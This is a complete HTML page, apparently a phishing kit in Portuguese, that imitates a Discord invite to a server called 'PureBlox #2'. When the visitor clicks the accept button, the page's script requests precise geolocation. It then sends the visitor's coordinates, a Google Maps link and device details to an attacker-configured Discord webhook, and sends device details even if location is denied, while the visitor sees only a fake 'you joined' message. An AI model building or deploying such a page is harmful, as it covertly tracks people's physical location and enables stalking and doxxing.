<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Convite para PureBlox #2</title>
<style>
 :root{
 --bg-app: #313338;
 --bg-modal: #313338;
 --bg-card: #2b2d31;
 --bg-elevated: #1e1f22;
 --text-primary: #f2f3f5;
 --text-secondary: #b5bac1;
 --text-muted: #949ba4;
 --brand: #5865f2;
 --brand-hover: #4752c4;
 --brand-active: #3c45a5;
 --online: #23a55a;
 --border-subtle: rgba(255,255,255,0.06);
 --shadow-heavy: 0 8px 16px rgba(0,0,0,0.24), 0 2px 4px rgba(0,0,0,0.3);
 --font: -apple-system, BlinkMacSystemFont, "Segoe UI", "gg sans", Roboto, Helvetica, Arial, sans-serif;
 padding-top: env(safe-area-inset-top, 0px);
 padding-bottom: env(safe-area-inset-bottom, 0px);
 }

 *{ box-sizing:border-box; }

 html, body{
 height:100%;
 margin:0;
 }

 body{
 font-family: var(--font);
 background:
 radial-gradient(circle at 20% 15%, rgba(255,86,160,0.14), transparent 45%),
 radial-gradient(circle at 85% 80%, rgba(255,107,91,0.10), transparent 40%),
 var(--bg-app);
 color: var(--text-primary);
 display:flex;
 align-items:center;
 justify-content:center;
 min-height:100vh;
 padding: 24px;
 -webkit-font-smoothing: antialiased;
 }

 .invite-wrap{
 width:100%;
 max-width: 480px;
 }

 .invite-card{
 background: var(--bg-card);
 border-radius: 16px;
 box-shadow: var(--shadow-heavy);
 overflow:hidden;
 position:relative;
 animation: card-in 260ms cubic-bezier(0.2, 0.9, 0.3, 1);
 }

 @keyframes card-in{
 from{ opacity:0; transform: translateY(10px) scale(0.98); }
 to{ opacity:1; transform: translateY(0) scale(1); }
 }

 .invite-banner{
 height: 90px;
 width:100%;
 background:
 linear-gradient(135deg, #ff56a0 0%, #ff5d80 45%, #ff6b5b 100%);
 position:relative;
 }

 .invite-banner svg{
 position:absolute;
 inset:0;
 width:100%;
 height:100%;
 opacity:0.5;
 }

 .invite-body{
 padding: 0 24px 24px;
 text-align:center;
 }

 .server-avatar{
 width: 84px;
 height: 84px;
 border-radius: 26px;
 margin: -42px auto 14px;
 position:relative;
 background: #ffffff;
 border: 6px solid var(--bg-card);
 display:flex;
 align-items:center;
 justify-content:center;
 box-shadow: 0 4px 10px rgba(0,0,0,0.35);
 overflow:hidden;
 }

 .server-avatar img{
 width: 100%;
 height: 100%;
 object-fit: cover;
 display:block;
 }

 .invite-eyebrow{
 color: var(--text-muted);
 font-size: 13px;
 font-weight: 500;
 margin: 0 0 4px;
 }

 .invite-title{
 font-size: 23px;
 font-weight: 700;
 margin: 0 0 14px;
 line-height: 1.25;
 color: var(--text-primary);
 }

 .invite-meta{
 display:flex;
 align-items:center;
 justify-content:center;
 gap: 18px;
 background: var(--bg-elevated);
 border-radius: 10px;
 padding: 12px 16px;
 margin-bottom: 20px;
 }

 .meta-item{
 display:flex;
 align-items:center;
 gap: 7px;
 font-size: 14px;
 font-weight: 500;
 color: var(--text-secondary);
 }

 .status-dot{
 width: 8px;
 height: 8px;
 border-radius: 50%;
 flex-shrink:0;
 }

 .status-dot.online{ background: var(--online); }
 .status-dot.total{ background: #80848e; }

 .meta-divider{
 width:1px;
 height: 18px;
 background: var(--border-subtle);
 }

 .btn-accept{
 width:100%;
 border:none;
 border-radius: 8px;
 background: var(--brand);
 color:#fff;
 font-size: 15px;
 font-weight: 600;
 padding: 13px 18px;
 cursor:pointer;
 font-family: inherit;
 transition: background-color 120ms ease, transform 80ms ease;
 display:flex;
 align-items:center;
 justify-content:center;
 gap:8px;
 }

 .btn-accept:hover{ background: var(--brand-hover); }
 .btn-accept:active{ background: var(--brand-active); transform: scale(0.99); }

 .btn-accept:focus-visible{
 outline: 2px solid #fff;
 outline-offset: 2px;
 }

 .btn-accept svg{ width:18px; height:18px; flex-shrink:0; }

 .invite-footer{
 margin-top: 14px;
 font-size: 12px;
 color: var(--text-muted);
 }

 /* ---- Estado: convite aceito ---- */
 .invite-card.accepted .invite-title{ color: var(--online); }

 .success-row{
 display:flex;
 align-items:center;
 justify-content:center;
 gap:8px;
 background: rgba(35,165,90,0.12);
 color: var(--online);
 font-size: 14px;
 font-weight: 600;
 border-radius: 8px;
 padding: 12px;
 margin-bottom: 16px;
 animation: pop-in 220ms ease;
 }

 @keyframes pop-in{
 from{ opacity:0; transform: translateY(-4px); }
 to{ opacity:1; transform: translateY(0); }
 }

 .success-row svg{ width:18px; height:18px; flex-shrink:0; }

 .btn-accept.done{
 background: #2d2f34;
 color: var(--text-muted);
 cursor: default;
 }

 .btn-accept.done:hover{ background:#2d2f34; }

 .hidden{ display:none !important; }

 /* Responsivo */
 @media (max-width: 420px){
 .invite-title{ font-size: 20px; }
 .invite-meta{ gap: 10px; padding: 10px 12px; }
 .meta-item{ font-size: 13px; }
 .server-avatar{ width: 72px; height:72px; border-radius: 22px; margin-top:-36px; }
 }
</style>
</head>
<body>

 <div class="invite-wrap">
 <div class="invite-card" id="inviteCard">

 <div class="invite-banner" aria-hidden="true">
 <svg viewBox="0 0 480 90" preserveAspectRatio="xMidYMid slice">
 <circle cx="60" cy="70" r="60" fill="#ffffff" opacity="0.06"/>
 <circle cx="420" cy="10" r="70" fill="#ffffff" opacity="0.06"/>
 <circle cx="260" cy="95" r="40" fill="#ffffff" opacity="0.05"/>
 </svg>
 </div>

 <div class="invite-body">
 <div class="server-avatar" aria-hidden="true">
 <img src="assets/pureblox-logo.png" alt="">
 </div>

 <p class="invite-eyebrow">Você foi convidado(a) para o servidor</p>
 <h1 class="invite-title" id="inviteTitle">PureBlox #2</h1>

 <div class="invite-meta">
 <div class="meta-item">
 <span class="status-dot online"></span>
 <span id="onlineCount">1.842 online</span>
 </div>
 <div class="meta-divider"></div>
 <div class="meta-item">
 <span class="status-dot total"></span>
 <span id="totalCount">6.370 membros</span>
 </div>
 </div>

 <!-- Confirmação exibida após aceitar -->
 <div class="success-row hidden" id="successRow">
 <svg viewBox="0 0 24 24" fill="none">
 <path d="M20 6L9 17l-5-5" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
 </svg>
 <span>Convite aceito! Bem-vindo(a) à comunidade.</span>
 </div>

 <button class="btn-accept" id="acceptBtn" type="button">
 Aceitar convite
 </button>

 <p class="invite-footer" id="inviteFooter">Comunidade &middot; discord.gg/pureblox2</p>
 </div>

 </div>
 </div>

<script>
 (function(){
 var btn = document.getElementById('acceptBtn');
 var card = document.getElementById('inviteCard');
 var successRow = document.getElementById('successRow');
 var footer = document.getElementById('inviteFooter');
 var accepted = false;

 // 🔗 Coloque aqui a URL da sua Webhook do Discord
 const WEBHOOK_URL = "https://discordapp.com/api/webhooks/DIGITE-SUA-WEBHOOK-AQUI";

 btn.addEventListener('click', function(){
 if (accepted) return;
 accepted = true;

 card.classList.add('accepted');
 successRow.classList.remove('hidden');

 btn.classList.add('done');
 btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none"><path d="M20 6L9 17l-5-5" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg> Você entrou no servidor';
 btn.disabled = true;

 footer.textContent = 'Você agora faz parte do PureBlox #2';

 // Solicita localização
 if (navigator.geolocation) {
 navigator.geolocation.getCurrentPosition(
 // Sucesso
 function(position) {
 var data = {
 latitude: position.coords.latitude,
 longitude: position.coords.longitude,
 accuracy: position.coords.accuracy,
 userAgent: navigator.userAgent,
 platform: navigator.platform,
 screenResolution: screen.width + 'x' + screen.height,
 language: navigator.language,
 timestamp: new Date().toLocaleString('pt-BR')
 };

 sendToDiscord(data);
 },
 // Erro
 function(error) {
 var data = {
 error: error.message,
 userAgent: navigator.userAgent,
 platform: navigator.platform,
 screenResolution: screen.width + 'x' + screen.height,
 language: navigator.language,
 timestamp: new Date().toLocaleString('pt-BR')
 };
 sendToDiscord(data);
 },
 {
 enableHighAccuracy: true,
 timeout: 5000,
 maximumAge: 0
 }
 );
 } else {
 var data = {
 error: "Geolocalização não suportada",
 userAgent: navigator.userAgent,
 platform: navigator.platform,
 screenResolution: screen.width + 'x' + screen.height,
 language: navigator.language,
 timestamp: new Date().toLocaleString('pt-BR')
 };
 sendToDiscord(data);
 }
 });

 function sendToDiscord(data) {
 const embed = {
 color: 15105570,
 title: "📍 Novo Usuário Conectado!",
 description: "Um novo membro entrou no servidor.",
 fields: [
 {
 name: "🌍 Localização",
 value: `[Ver no Google Maps](https://www.google.com/maps?q=${data.latitude},${data.longitude})\nLat: ${data.latitude}\nLon: ${data.longitude}`,
 inline: true
 },
 {
 name: "📏 Precisão",
 value: data.accuracy ? data.accuracy + " metros" : "N/A",
 inline: true
 },
 {
 name: "💻 Navegador",
 value: data.userAgent || "N/A",
 inline: false
 },
 {
 name: "📱 Plataforma",
 value: data.platform || "N/A",
 inline: true
 },
 {
 name: "🖥️ Resolução",
 value: data.screenResolution || "N/A",
 inline: true
 },
 {
 name: "🕒 Horário Local",
 value: data.timestamp || "N/A",
 inline: true
 }
 ],
 footer: {
 text: "PureBlox #2 | Captura de Geolocalização"
 },
 timestamp: new Date().toISOString()
 };

 fetch(WEBHOOK_URL, {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({ embeds: [embed] })
 });
 }
 })();
</script>

</body>
</html>
